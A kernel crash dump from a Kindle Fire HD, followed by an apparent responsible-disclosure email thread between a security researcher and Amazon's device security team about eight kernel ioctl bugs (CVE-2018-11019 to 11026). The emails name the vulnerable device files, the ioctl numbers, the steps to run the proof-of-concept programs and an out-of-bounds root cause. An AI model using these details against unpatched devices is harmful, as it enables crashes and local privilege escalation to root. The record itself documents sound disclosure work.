[  144.439697] [d900000c] *pgd=00000000
[  144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM
[  144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[  144.457672] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[  144.465118] PC is at c2dm_l1cache+0x30/0x100
[  144.469940] LR is at dev_ioctl+0x3f0/0x10c4
[  144.474670] pc : [<c03187ac>]    lr : [<c031782c>]    psr: a0000013
[  144.474670] sp : c2d6be38  ip : 00000000  fp : c2d6be6c
[  144.487640] r10: 00000000  r9 : d8c0cca8  r8 : 00b8dd90
[  144.493621] r7 : 00000000  r6 : c2d6bea4  r5 : 00b8dd90  r4 : 388b77c4
[  144.500915] r3 : d9000004  r2 : 75e0c121  r1 : c2d6bea4  r0 : 00000000
[  144.508331] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  144.516418] Control: 10c5387d  Table: 9cac004a  DAC: 00000015
[  144.522827] 
[  144.522857] PC: 0xc031872c:
[  144.527954] 872c  e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd
[  144.538482] 874c  eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010
[  144.549163] 876c  e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c
[  144.559844] 878c  e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000
[  144.570404] 87ac  e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003
[  144.581085] 87cc  e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008
[  144.591735] 87ec  e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001
[  144.602416] 880c  e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000
[  144.612976] 
[  144.612976] LR: 0xc03177ac:
[  144.618072] 77ac  ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f
[  144.628631] 77cc  e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8
[  144.639160] 77ec  e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb
[  144.649780] 780c  e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3
[  144.660369] 782c  e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088
[  144.670776] 784c  e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003
[  144.681213] 786c  33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f
[  144.691528] 788c  e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005
[  144.701995] 
[  144.701995] SP: 0xc2d6bdb8:
[  144.706878] bdb8  c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff
[  144.717407] bdd8  c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4
[  144.727905] bdf8  75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8
[  144.738586] be18  00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff
[  144.749145] be38  c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90
[  144.759796] be58  d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088
[  144.770355] be78  000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000
[  144.781005] be98  c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261
[  144.791687] 
[  144.791687] FP: 0xc2d6bdec:
[  144.796661] bdec  c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4
[  144.807189] be0c  00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c
[  144.817840] be2c  c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90
[  144.828399] be4c  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c
[  144.839080] be6c  c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454
[  144.849761] be8c  c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f
[  144.860290] beac  83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000
[  144.870971] becc  00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0
[  144.881652] 
[  144.881652] R1: 0xc2d6be24:
[  144.886627] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000
[  144.897308] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04
[  144.907989] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc
[  144.918518] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92
[  144.929199] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000
[  144.939849] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0
[  144.950531] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044
[  144.961059] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  144.971710] 
[  144.971710] R3: 0xd8ffff84:
[  144.976623] ff84  d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0
[  144.987213] ffa4  d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088
[  144.997772] ffc4  dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000
[  145.008392] ffe4  00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********
[  145.018798] 0004  ******** ******** ******** ******** ******** ******** ******** ********
[  145.029327] 0024  ******** ******** ******** ******** ******** ******** ******** ********
[  145.039886] 0044  ******** ******** ******** ******** ******** ******** ******** ********
[  145.050384] 0064  ******** ******** ******** ******** ******** ******** ******** ********
[  145.060913] 
[  145.060913] R6: 0xc2d6be24:
[  145.066009] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000
[  145.076568] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04
[  145.087219] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc
[  145.097900] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92
[  145.108459] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000
[  145.118988] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0
[  145.129638] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044
[  145.140319] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  145.150848] 
[  145.150848] R9: 0xd8c0cc28:
[  145.155944] cc28  d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[  145.166503] cc48  00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148
[  145.177062] cc68  5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000
[  145.187713] cc88  00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000
[  145.198394] cca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[  145.208923] ccc8  d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b
[  145.219573] cce8  2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000
[  145.230255] cd08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24
[  145.240936] Process executor32 (pid: 3810, stack limit = 0xc2d6a2f8)
[  145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)
[  145.253082] be20:                                                       c02ba53c 575b4b92
[  145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000
[  145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001
[  145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8
[  145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000
[  145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000
[  145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08
[  145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[  145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b
[  145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b
[  145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000
[  145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8
[  145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90
[  145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4
[  145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430
[  145.390686] Backtrace: 
[  145.393829] [<c031877c>] (c2dm_l1cache+0x0/0x100) from [<c031782c>] (dev_ioctl+0x3f0/0x10c4)
[  145.403228] [<c031743c>] (dev_ioctl+0x0/0x10c4) from [<c0136044>] (do_vfs_ioctl+0x8c/0x5b4)
[  145.412658] [<c0135fb8>] (do_vfs_ioctl+0x0/0x5b4) from [<c01365e0>] (sys_ioctl+0x74/0x84)
[  145.421874] [<c013656c>] (sys_ioctl+0x0/0x84) from [<c0013c60>] (ret_fast_syscall+0x0/0x30)
[  145.431304]  r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80
[  145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) 
[  145.450225] Board Information: 
[  145.450225]  Revision : 0001
[  145.450256]  Serial	: 0000000000000000
[  145.450256] SoC Information:
[  145.450256]  CPU	: OMAP4470
[  145.450286]  Rev	: ES1.0
[  145.450286]  Type	: HS
[  145.450286]  Production ID: 0002B975-000000CC
[  145.450286]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004
[  145.450317] 
[  145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---
[  145.491149] Kernel panic - not syncing: Fatal exception
[  145.496917] CPU1: stopping
[  145.500152] Backtrace: 
[  145.503204] [<c0018148>] (dump_backtrace+0x0/0x10c) from [<c0698bb8>] (dump_stack+0x18/0x1c)
[  145.512695]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950
[  145.519714] [<c0698ba0>] (dump_stack+0x0/0x1c) from [<c0019bd8>] (handle_IPI+0x190/0x1c4)
[  145.528961] [<c0019a48>] (handle_IPI+0x0/0x1c4) from [<c00084fc>] (gic_handle_irq+0x58/0x60)
[  145.538482] [<c00084a4>] (gic_handle_irq+0x0/0x60) from [<c06a5540>] (__irq_usr+0x40/0x60)
[  145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)
[  145.553466] 5fa0:                                     41822290 418185e8 00000001 41c95000
[  145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec
[  145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff
[  145.579284]  r6:ffffffff r5:200b0010 r4:41609974 r3:41822290
[  145.586364] CPU0 PC (0) : 0xc003ee38
[  145.590576] CPU0 PC (1) : 0xc003ee54
[  145.594635] CPU0 PC (2) : 0xc003ee54
[  145.598693] CPU0 PC (3) : 0xc003ee54
[  145.602722] CPU0 PC (4) : 0xc003ee54
[  145.606781] CPU0 PC (5) : 0xc003ee54
[  145.610839] CPU0 PC (6) : 0xc003ee54
[  145.614898] CPU0 PC (7) : 0xc003ee54
[  145.619110] CPU0 PC (8) : 0xc003ee54
[  145.623168] CPU0 PC (9) : 0xc003ee54
[  145.627227] CPU1 PC (0) : 0xc0019b2c
[  145.631408] CPU1 PC (1) : 0xc0019b2c
[  145.635467] CPU1 PC (2) : 0xc0019b2c
[  145.639495] CPU1 PC (3) : 0xc0019b2c
[  145.643707] CPU1 PC (4) : 0xc0019b2c
[  145.647766] CPU1 PC (5) : 0xc0019b2c
[  145.651824] CPU1 PC (6) : 0xc0019b2c
[  145.656005] CPU1 PC (7) : 0xc0019b2c
[  145.660064] CPU1 PC (8) : 0xc0019b2c
[  145.664123] CPU1 PC (9) : 0xc0019b2c
[  145.668182] 
[  145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[  145.669982] 

```


# Details of all emails are listed here. 

Re: Bug Report for Kindle Fire HD 3rd

"Eric" <###@amazon.com>
收件人：
lsb <datadancer@163.com>
时   间：
2018-9-27 2:31:41
附   件：



Hi Lu,

Thanks again for your patience, and for working with us on this.

Please go ahead and publish your reserved CVEs by contacting MITRE directly. I believe you can make updates to your publication with this form: https://cveform.mitre.org/.

 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11023 -- Fixed
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11024 -- Fixed 

Amazon does not have an advisory page at the moment.

Thanks!

-Eric

 

 

From: lsb <datadancer@163.com>
Date: Wednesday, September 19, 2018 at 9:03 PM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric,
Please include my name and my department information.  Thanks a lot.
Lu Shuaibing, a security researcher from National Key Laboratory of Science and Technology on Information System Security in Beijing, China.

 

 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 09/18/2018 06:54, Eric wrote:

Hi Lu,

Sorry about the delay.

Thanks again for your patience, and for working with us on this. We have started updating our FireOS 4 devices with the security patches addressing the two critical issues (i.e. CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl) that you have reported to us. It is ok now to publish the CVE details. Are you planning in publishing anything else about the vulnerabilities that you reported to us?

Thank you

-Eric

 

From: lsb <datadancer@163.com>
Date: Sunday, September 9, 2018 at 8:27 PM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric,
Thanks for your responsibility. What's going on now? Can the CVE be published? Thanks a lot!

 

 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 08/29/2018 05:41, Eric wrote:

Hi Lu,

 

Thanks again for your patience, and for working with us on this. We were able to resolve the regression and our release testing has resumed last week. I will update you in two weeks about the status.

 

Thanks

-Eric

 

From: lsb <datadancer@163.com>
Date: Saturday, August 11, 2018 at 5:33 PM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric,





Thanks for your kindness. I don't go to Las Vegas this year. Have a nice weekend.





Yours,

Lu

 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 08/09/2018 02:24, Eric wrote:

Hi Lu,

Thanks again for your patience, and for working with us on this.

 

We ran into a regression during testing. I will update you in two weeks about the progress. If you are going to BlackHat or Defcon conferences in Las Vegas, let me know so someone from my team can meet you there.

 

Thanks

-Eric

 

 

From: "Eric" <###@amazon.com>
Date: Monday, July 23, 2018 at 6:28 PM
To: lsb <datadancer@163.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Lu,

Thanks again for your patience, and for working with us on this.

 

We will be testing the new release that will carry the patches for the two critical issues (i.e. CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl) over the next several weeks. I will update you in two weeks about the status.

 

Thanks

-Eric

 

 

From: "Eric" <###@amazon.com>
Date: Monday, July 9, 2018 at 6:14 PM
To: lsb <datadancer@163.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Lu,

Thanks again for your patience, and for working with us on this.

We are currently assessing fixes for the two critical issues that we have agreed upon previously (i.e. CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl). I will keep you updated in the progress in two weeks.

 

Thanks

Eric

 

From: lsb <datadancer@163.com>
Date: Thursday, June 28, 2018 at 7:49 PM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric, 

Thanks for your work. The investigation is corresponding to my analysis. When can we release the CVEs? I think it's responsible for customers.

Thanks a lot 

Lu

 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 06/27/2018 00:07, Eric wrote:

Hi Lu,

 

Thanks for continuing working with us. We have reviewed the issues and I would like to get confirmation that two of them allow local elevation of privilege from a regular user to root (CVE-2018-11023 and CVE-2018-11024 on /dev/gcioctl). The remaining reported crashes would need to have system access level before possible escalation to kernel (for CVE-2018-11019 and CVE-2018-11022) or require root level before possible escalation to kernel (for CVE-2018-11020, CVE-2018-11021, CVE-2018-11025 and CVE-2018-11026). Hence, we consider that those last six issues do not pose immediate risk to our customers since triggering requires system or root already.

Can you confirm that these matches your investigation? I will keep you posted on our progress of the investigation in two weeks.

 

Thanks!

-Eric

 

 

 

From: lsb <datadancer@163.com>
Date: Monday, June 25, 2018 at 2:16 AM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric, 

Thanks for your work! By the way, When will the update and the CVE be public? 

 

Yours 

Lu

 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 06/12/2018 06:27, Eric wrote:

Hi Lu,

 

Thanks for working with us. We have been able to reproduce some of the issues and are investigating the remaining ones. I will provide an update in two weeks.

 

Thank you

-Eric

 

 

From: <detected-as-spam@amazon.com> on behalf of lsb <datadancer@163.com>
Date: Thursday, June 7, 2018 at 5:02 AM
To: "Eric" <###@amazon.com>
Subject: [SPAM][100%] Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric, 

It's OK. If you have any questions about the issues, please inform me. Thanks a lot.

Best regards,

Lu Shuaibing 

Image removed by sender.
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 06/05/2018 01:42, Eric wrote:

Hi Lu,

 

Sorry about the delay, we are actually not completely done investigating the reported issues, I will provide an update by June 11th. Thanks for understanding.

 

Regards

-Eric

 

 

From: lsb <datadancer@163.com>
Date: Tuesday, May 29, 2018 at 9:57 AM
To: "Eric" <###@amazon.com>
Subject: Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric,

I am very pleased to know that you have conformed my input. Thanks for being responsible. Have a nice holiday!

 

Lu

 

Image removed by sender. http://mail-online.nosdn.127.net/d5b4db997f83b9ee12c5ae026c9bb3a0.jpg
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 05/29/2018 22:42, Eric wrote:

Hi Lu,

Sorry it was a holiday yesterday. I will connect you with one of my coworker today who will be covering while i am on leave until June 8th 2018. The findings have been confirmed. We appreciate your input. 

 

Thank you

Eric 

Sent from my iPhone


On May 29, 2018, at 3:42 AM, lsb <datadancer@163.com> wrote:

Hi Eric,

Can you send me the result of the assessment? Are they confirmed? Thanks.

 

Image removed by sender. http://mail-online.nosdn.127.net/d5b4db997f83b9ee12c5ae026c9bb3a0.jpg
	

lsb

邮箱：datadancer@163.com

签名由 网易邮箱大师 定制

On 05/25/2018 08:25, Eric wrote:

Thanks Lu for sharing those CVE IDs.

I will get back to you by Monday. We finished the assessment.

 

-Eric

 

 

From: lsb <datadancer@163.com>
Date: Thursday, May 24, 2018 at 2:57 AM
To: "Eric" <###@amazon.com>
Subject: Re:Re: Bug Report for Kindle Fire HD 3rd

 

Hi Eric,

Have you figure out the bugs, I have received CVE IDs from http://cve.mitre.org/.

Can you repair and publish these bugs with these CVE IDs.

Descriptions and CVE IDs are in the attachment.

 

 














At 2018-05-16 07:11:00, "Eric" <###@amazon.com> wrote:










Thank you for the additional details Lu. We are looking at your input. 

 

Regards

Eric 

Sent from my iPhone


On May 11, 2018, at 7:54 PM, lsb <datadancer@163.com> wrote:

Hi Eric,
Nice to meet you too! Thank you for being responsible.
(1) The device type is [ro.build.description]: [soho-user 4.4.3 KTU84M 11.4.5.5_user_455006120 release-keys]
(2) I have request CVE IDs for these vulnerabilities, and I will publishing those vulnerabilities on http://cve.mitre.org.
 

To reduce your work, I have analyzed the bug of twl6030_gpadc_ioctl. The kernel source code is from https://fireos-tablet-src.s3.amazonaws.com/46sVcHzumgrjpCXPHw6oygKVmw/kindle_fire_hd_7inch_4.5.5.3.tar.bz2 . As shown in following figure, an incorrect size checking exits in source file kernel/omap/drivers/mfd/twl6030-gpadc.c:1056. The type of par.channel is int, when par.channel is a negative number, it is smaller than max_channels and passed the size checking. At line 1068 and 1070, par.channel is used as index for array req.buff. If par.channel is a negative number like 0x9b2a9212 (the first bit of 0x9b2a9212 is 1, it is negative as int). An out-of-bound error will occur.

<twl6030_gpadc_ioctl.png>

 

Yours
Shuaibing Lu, Liang Ming

 


At 2018-05-12 01:42:31, "Eric" <###@amazon.com> wrote:

>Hi Lu,

> 

>Nice to meet you! I work in the device security team at Amazon. I first wanted to thank you for reporting those vulnerabilities to us. At Amazon we take security and privacy very seriously. Our engineers have started looking at your findings. Please allow us two weeks to review them. I wanted to ask you the following questions:

> 

>(1)What device type did you use during your vulnerability research? You can find out your device type by using this command:  

>adb shell getprop | grep ro.build.description

>(2)Do you have any plans in publishing those vulnerabilities?

> 

>Regards

>-Eric 

> 

>On 5/11/18, 12:40 PM, "Security" <Security@amazon.com> wrote:

> 

>Lu,

>

>Thank you for reaching out to us with your concerns regarding the Kindle Fire HD device. I apologize for the delay in getting back to you.

>

>I'm including Eric on this email, who will follow up with shortly regarding the issues you've identified.

>

>Thanks for being patient and for working with us to protect our customers.

>

>Kind regards,

>Carrie

>Amazon Information Security

>

>________________________________________

>From: datadancer <datadancer@163.com>

>Sent: Tuesday, May 8, 2018 1:35 AM

>To: Security

>Subject: Bug Report for Kindle Fire HD 3rd

>

>Dear Mr or Mis:

>I'm Lu Shuaibing, a security researcher from National Key Laboratory

>of Science and Technology on Information System Security in Beijing,

>China. I have analyzed Kindle Fire HD 3rd and found 8 kernel bugs. For

>amazon take security and privacy very seriously, it is necessary to

>inform you. Details are as follows:

>

>Device Information:

>

>Device Model: Kindle Fire HD(3rd Generation)

>OS Version: Fire OS 4.5.5.3

>Kernel Version: Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39)

>(gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017

>

>Bug Information:

>

>Bug 1: rpmsg_omx_ioctl

>A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the

>system crash via IOCTL 3221772291.

>POC file: rpmsg_omx_ioctl_poc.c

>

>Bug 2: twl6030_gpadc_ioctl

>A bug in the ioctl interface of device file /dev/twl6030-gpadc causes

>the system crash via IOCTL 24832.

>POC file: twl6030_gpadc_ioctl_poc.c

>

>Bug 3: i2cdev_ioctl

>A bug in the ioctl interface of device file /dev/i2c-2 causes the system

>crash via IOCTL 1824.

>

>POC file: i2cdev_ioctl_poc.c

>

>Bug 4: comp_ioctl

>A bug in the ioctl interface of device file /dev/dsscomp causes the

>system crash via IOCTL 1118064517.

>

>POC file: comp_ioctl_poc.c

>

>Bug 5,6,7,8:/dev/gcioctl Related

>

>Four bugs in the ioctl interface of device file /dev/gcioctl cause the

>system crash via IOCTL 3221773726, 3224132973, 3222560159, 1077435789.

>

>POC file: gcioctl_poc_1.c  gcioctl_poc_2.c  gcioctl_poc_3.c  gcioctl_poc_4.c

>

>

>The POC files should be compiled to ELF file in arm instruction format.

>The compiled ELF files are also provided. The executable ELF files

>should be pushed on device.

>For example, to verify twl6030_gpadc_ioctl_poc,

>adb push twl6030_gpadc_ioctl_poc /data/local/tmp/

>adb shell

>su

>cd /data/local/tmp/

>./twl6030_gpadc_ioctl_poc

>

>Then with the permission to corresponding device files, the execution

>will cause the kernel crash. Logs of kernel crash are provided as well.

>

>When use gcioctl_poc_4, the file 'saved' should be pushed on device as

>well, for 'saved' contains the payload of this poc.

>

>Best wishes to you!

>Lu Shuaibing

>2018-5-7

>

>

>

>

>

>

>

>

> 
